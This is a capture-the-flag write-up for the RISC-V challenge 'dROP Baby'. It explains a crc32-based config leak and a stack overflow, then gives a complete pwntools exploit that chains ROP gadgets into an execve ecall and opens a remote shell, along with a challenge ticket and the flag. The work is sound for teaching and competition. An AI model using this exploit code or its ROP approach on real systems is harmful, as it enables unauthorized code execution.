# dROP Baby

## Challenge

We are given a 32-bit RISC-V binary.
The binary is being run on an Ubuntu x86\_64 system through QEMU.

### Checksec

```
    Arch:     em_riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

## Solution

Unlike the previous challenge, we are not given any leaks.

There is a similar synchronisation and mode selection system as the previous RISC-V challenge, but with different values.

The lengths of the `read` calls are read from a server.ini config file, which we are not provided.

Each mode requires that the last 4 bytes of our message is the crc32 of the message contents.
However, without knowing the length of the message, this is not simple to pass.

The 0xb1 mode allows us to leak the config dictionary.
It also requires a checksum to match, but we can send a message where every 4 bytes is the crc32 of the previous bytes.
Thus, as long as the actual read length is a multiple of 4, it will print the config dictionary.
If it is not a multiple of 4, we can attempt this again at an offset and succeed within 4 tries.

Once we leak the dictionary, we get the following values:

```
Application Name : Baby dROP
A1_MSG_LEN : 40
A2_LSG_LEN : 10
B1_MSG_LEN : 20
B2_MSG_LEN : 300
CC_MSG_LEN : 25
ZY_MSG_LEN : 0
SILENT_ERRORS : TRUE
```

Comparing these values to the stack buffer sizes, we see that the `B2_MSG_LEN` is much greater than the buffer in the 0xb2 mode.
There is no canary, so we can use this to overwrite the saved return address.

Unlike the previous challenge, NX is enabled, so we cannot jump to shellcode on the stack.
However, PIE is disabled, so we can use ROP gadgets fromm the binary.

Many RISC-V gadgets use a lot of stack gadgets, so our first ROP chain simply calls the input function again, but with a longer length, so we can send a larger payload.

Our second ROP chain uses a combination of gadgets to set up an execve ecall and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host drop.quals2023-kah5Aiv9.satellitesabove.me --port 5300
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = 'drop-baby'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'drop.quals2023-kah5Aiv9.satellitesabove.me'
port = int(args.PORT or 5300)
ticket = b'ticket{alpha130613papa4:GM669oQhW-YRnqeTRmIkI-d1MFfLq-N4LVGpMTm3JhWZoe0tG_yiCwUZ8XgjY29fTQ}'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['qemu-riscv32', '-g', '1234', exe] + argv, env={'FLAG': 'test{flag}'}, *a, **kw)
    else:
        return process(['qemu-riscv32', exe] + argv, env={'FLAG': 'test{flag}'}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b'Ticket please:\n', ticket)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recvuntil(b'Exploit me!')

# DUMP CONFIG
io.send(b'\xde\xad\xbe\xef')
io.send(b'\xb1')
msg = b''
for i in range(5):
    msg += p32(crc.crc_32(msg))
io.send(msg)
print((io.recvuntil(b'-\n') + io.recvuntil(b'-\n')).decode())

"""
   2a2a0:   4322                    lw  t1,8(sp)
   2a2a2:   4f12                    lw  t5,4(sp)
   2a2a4:   5426                    lw  s0,104(sp)
   2a2a6:   48c2                    lw  a7,16(sp)
   2a2a8:   4832                    lw  a6,12(sp)
   2a2aa:   4e82                    lw  t4,0(sp)  
   2a2ac:   50b6                    lw  ra,108(sp)
   2a2ae:   5496                    lw  s1,100(sp)
   2a2b0:   5906                    lw  s2,96(sp)  
   2a2b2:   49f6                    lw  s3,92(sp) 
   2a2b4:   4a66                    lw  s4,88(sp) 
   2a2b6:   4b46                    lw  s6,80(sp)    
   2a2b8:   4bb6                    lw  s7,76(sp) 
   2a2ba:   4c26                    lw  s8,72(sp)    
   2a2bc:   4c96                    lw  s9,68(sp) 
   2a2be:   4d06                    lw  s10,64(sp)
   2a2c0:   5df2                    lw  s11,60(sp)
   2a2c2:   87d6                    mv  a5,s5
   2a2c4:   4ad6                    lw  s5,84(sp) 
   2a2c6:   4701                    li  a4,0      
   2a2c8:   4681                    li  a3,0
   2a2ca:   4601                    li  a2,0                             
   2a2cc:   859a                    mv  a1,t1
   2a2ce:   857a                    mv  a0,t5                                        
   2a2d0:   6165                    addi    sp,sp,112
   2a2d2:   8e82                    jr  t4
"""

"""
   1a848:   4632                    lw  a2,12(sp)
   1a84a:   45a2                    lw  a1,8(sp)
   1a84c:   4512                    lw  a0,4(sp)
   1a84e:   40f2                    lw  ra,28(sp)
   1a850:   6105                    addi    sp,sp,32
   1a852:   8782                    jr  a5
"""

"""
   3839c:   00000073            ecall
   383a0:   8082                    ret
"""

gadget1 = 0x2a2a0
gadget2 = 0x1a848
do_b2 = 0x00010f54
read = 0x0002184e
ecall = 0x3839c
buf = 0x000713a0

io.send(b'\xde\xad\xbe\xef')
io.send(b'\xb2')

io.send(flat({0x74: [

    gadget1,

    flat({
        0: do_b2, # jr
        4: 0x200, # a0
        84: read, # s5
        108: gadget1, # ret
    }, length=112),

]}, length=300))

io.send(flat({0x74: [

    gadget1,

    flat({
        0: gadget2, # jr
    }, length=112),

    flat({
        4: 0, # a0
        8: buf, # a1
        12: 8, # a2
        28: gadget1, # ret
    }, length=32),

    flat({
        0: ecall, # jr
        4: buf, # a0
        8: 0, # a1
        16: 0xdd, # a7
    }, length=112),

]}, length=0x200))

io.send(b'/bin/sh\x00')

io.interactive()
```

## Flag

```
flag{alpha130613papa4:GPkXUAE33nBipQPXIl8qmWCePP-MwZrSZteipeJvr3_EY9mDG9ahe3V4G4GRXakUHoNIEEt8FTT1XcgdOeYjj24}
```